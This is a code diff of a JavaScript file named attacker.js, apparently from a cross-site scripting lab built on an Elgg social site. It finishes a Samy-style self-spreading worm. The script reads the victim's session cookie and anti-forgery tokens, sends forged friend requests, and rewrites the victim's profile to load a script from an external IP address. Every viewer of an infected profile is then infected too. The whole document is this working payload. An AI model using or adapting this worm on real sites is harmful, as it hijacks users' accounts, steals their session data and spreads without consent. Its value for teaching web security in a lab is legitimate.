@@ -1,23 +1,23 @@
 console.log("Hello I am the attacker!");
-console.log(document.all[35].attributes[0].nodeValue);
-console.log(document.all[33].attributes[0].nodeValue);
-console.log(document.getElementsByClassName("elgg-menu-content")[2].href);
-console.log(document.all[39].attributes[0].nodeValue);
+//console.log(document.all[35].attributes[0].nodeValue);
+//console.log(document.all[33].attributes[0].nodeValue);
+//console.log(document.getElementsByClassName("elgg-menu-content")[2].href);
+//console.log(document.all[39].attributes[0].nodeValue);
 
-let __elgg_ts = String(document.all[35].attributes[0].nodeValue).substr(50, 10);
-let __elgg_token = String(document.all[35].attributes[0].nodeValue).substr(74, 22);
+let __elgg_ts = document.getElementsByClassName("elgg-menu-content")[2].href.substr(50, 10);
+let __elgg_token = document.getElementsByClassName("elgg-menu-content")[2].href.substr(74, 22);
 let samy_id = String(47);
 let cookie = document.cookie;
 let me = document.getElementsByClassName("elgg-border-plain elgg-transition")[0].alt;
-let myid = document.getElementsByClassName("elgg-border-plain elgg-transition")[0].src.substr(104, 2);
+let my_id = document.getElementsByClassName("elgg-border-plain elgg-transition")[0].src.substr(104, 2);
 console.log("samy_id = " + samy_id);
 console.log("cookie = " + cookie);
 console.log("__elgg_ts = " + __elgg_ts);
 console.log("__elgg_token = " + __elgg_token);
 console.log("me = " + me);
-console.log("myid = " + myid);
-/*
-if (me != "samy") {
+console.log("my_id = " + my_id);
+
+if (me != "Samy") {
 	// make friends
 	var Ajax1=null;
 	Ajax1=new XMLHttpRequest();
@@ -35,7 +35,7 @@ if (me != "samy") {
 	// alter profile
 	var Ajax2=null;
 	Ajax2=new XMLHttpRequest();
-	let http_url2 = 'http://www.xsslabelgg.com/action/profile/edit?__elgg_token='+__elgg_token+'&__elgg_ts='+__elgg_ts+'&name='+me+'&description=&accesslevel[description]=2&briefdescription=<script type="text/javascript" src=http://13.58.241.86:8888/js/attacker.js></script>&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid='+12;
+	let http_url2 = 'http://www.xsslabelgg.com/action/profile/edit?__elgg_token='+__elgg_token+'&__elgg_ts='+__elgg_ts+'&name='+me+'&description=&accesslevel[description]=2&briefdescription=<script type="text/javascript" src=http://13.58.241.86:9999/js/attacker.js></script>&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid='+my_id;
 	console.log(http_url2);
 	Ajax2.open("POST",http_url2,true);
 	Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
@@ -49,4 +49,3 @@ if (me != "samy") {
 else {
 	console.log("I am samy, I don't need to be my friend or alter my profile.");
 }
-*/
